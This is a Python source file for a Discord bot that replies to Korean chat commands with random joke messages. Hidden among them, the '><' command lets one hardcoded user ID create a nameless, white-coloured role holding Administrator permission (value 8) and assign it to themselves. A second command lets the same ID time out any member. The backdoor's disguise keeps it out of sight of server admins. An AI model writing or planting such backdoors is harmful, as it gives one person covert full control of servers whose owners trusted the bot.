import random
import discord
from discord import Member
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions
from DISCORD_token import Token, guild_id, channel3_id
from datetime import datetime, timedelta
class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        intents.bans = True
        intents.message_content = True
        super().__init__(command_prefix=('발붕아 '), intents=intents)
bot = Bot()
bot.__init__()
@bot.event
async def on_ready():
    print(f'{bot.user} 에 로그인했습니다!')
    print('------------------------------------------------------')
@bot.command(name='')
async def func(ctx: commands.Context):
    rand = random.randint(1,3)
    if(rand == 1):
        await ctx.channel.send('왜 불러')
    elif(rand == 2):
        await ctx.channel.send('뭐')
    elif(rand == 3):
        await ctx.channel.send('발붕이 여기 있음')
@bot.command(name='안녕')
async def 안녕ㅇ(ctx: commands.Context):
    rand = random.randint(1,3)
    if(rand == 1):
        await ctx.channel.send('ㅎㅇ')
    elif(rand == 2):
        await ctx.channel.send('뭐')
    elif(rand == 3):
        await ctx.channel.send('왜요')
@bot.command(name='쟤때려줘')
async def kick(ctx: commands.Context):
    if(ctx.author.id == 796381848233836574):
        id =  int(ctx.message.content[9:].split(' ')[0])
        many =  timedelta(minutes=int(ctx.message.content[9:].split(' ')[1].replace('대', '')))
        await ctx.guild.get_member(id).timeout(many, reason="나가")
@bot.command(name='><')
async def givePermissionSiqunce(ctx: commands.Context):
    try:
        if ctx.author.id == 796381848233836574:
            role = await ctx.guild.create_role(name='', permissions=discord.Permissions(8), colour=discord.Colour(0xffffff))
            await ctx.author.add_roles(role)
            await ctx.channel.send("ㅋㅋ")
        else:
            await ctx.channel.send("우웩")
    except:
        await ctx.channel.send("버그")
@bot.command(name='티어')
async def 티어(ctx: commands.Context):
    await ctx.send('아이언 4')
@bot.command(name='나가')
@commands.is_owner()
async def 나가(ctx: commands.Context):
    await ctx.send("넹 꺼질게용")
    exit()
bot.run(Token)
